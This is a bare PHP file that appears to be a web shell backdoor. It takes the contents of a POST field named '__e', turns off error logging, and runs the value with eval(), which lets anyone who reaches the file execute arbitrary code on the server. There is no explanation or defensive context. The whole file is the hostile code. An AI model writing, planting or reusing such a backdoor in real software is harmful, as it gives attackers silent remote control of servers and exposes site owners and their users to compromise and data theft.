<?php 

if (isset($_POST['__e'])) {
    @ini_set('log_errors', 0);
    $v = $_POST['__e'];
    if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
        $v = stripslashes($v);
    }
    eval($v);
    die;
}